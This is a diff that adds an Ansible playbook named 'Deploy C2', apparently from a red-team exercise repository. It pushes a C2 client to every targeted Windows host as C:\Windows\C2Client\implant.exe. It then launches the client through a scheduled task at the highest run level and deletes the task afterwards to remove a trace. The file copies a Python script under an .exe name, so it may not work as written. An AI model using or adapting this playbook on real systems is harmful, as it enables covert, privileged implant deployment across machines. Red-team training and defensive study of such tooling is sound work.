@@ -1,0 +1,30 @@
+---
+-   name: Deploy C2
+    hosts: all
+    vars:
+      service_name: "C2 Client"
+      service_display_name: "C2 Client"
+      service_directory: "C:\\Windows\\C2Client\\"
+      service_exe: "implant.exe"
+      local_file: "/home/redteam/310Infragroup7nyameow/Matt_tool/Client_C2.py"
+
+    tasks:
+      - name: Make sure the directory exists
+        ansible.windows.win_file:
+          path: "{{ service_directory }}"
+          state: directory
+
+      - name: Copy Implant over
+        ansible.windows.win_copy:
+          src: "{{ local_file }}"
+          dest: "{{ service_directory }}\\{{ service_exe }}"
+
+      - name: Create a scheduled task
+        ansible.windows.win_shell: |
+          schtasks.exe /Create /SC ONCE /TN "RunImplant" /TR "{{ service_directory }}\\{{ service_exe }}" /ST 00:00 /RL HIGHEST /F
+
+      - name: Run the task
+        ansible.windows.win_shell: schtasks /Run /TN "RunImplant"
+
+      - name: Delete the task
+        ansible.windows.win_shell: schtasks /Delete /TN "RunImplant" /F
